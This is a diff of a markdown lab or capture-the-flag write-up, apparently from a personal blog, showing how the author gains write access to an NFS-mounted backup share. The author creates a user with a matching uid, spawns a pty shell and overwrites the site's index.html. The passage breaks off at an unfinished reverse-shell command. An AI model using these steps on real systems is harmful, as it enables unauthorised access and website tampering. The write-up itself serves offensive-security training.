@@ -194,11 +194,38 @@ command:```stat -c "%u" new_backup```
 ```
 We can see the owner of that directory has an uid of ```2017```
 
-Lets use the ```usermod``` command to modify the uid of this user
+Lets use the ```usermod``` command to modify the uid of this user, before that we'll create a new user
 
+commands
+```
+sudo useradd senjumaru
+sudo passwd senjumaru
+sudo usermod -u 2017 senjumaru
+su senjumaru
+python3 -c "import pty;pty.spawn('/bin/bash')"
+cd /mnt/new_backup
+```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e75be6c2-5086-4a39-916c-b5c82afe47d3)
 
+cool cool, we can now view the contents of that directory, which means we have read and write access.
 
+Lets modify the contents of the ```index.html``` file, then we'll head over to the webpage to see if it works
+
+```
+senjumaru@bl4ck4non-sec:/mnt/new_backup$ echo "vawulence" > index.html
+senjumaru@bl4ck4non-sec:/mnt/new_backup$ cat index.html 
+vawulence
+```
+Navigating to the webpage
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/331e71c6-2679-4ead-a0a8-47ab10d440a2)
+
+Worked hehe.
+
+Lets inject our reverse shell into this 
+
+command:```echo "
 
 
 
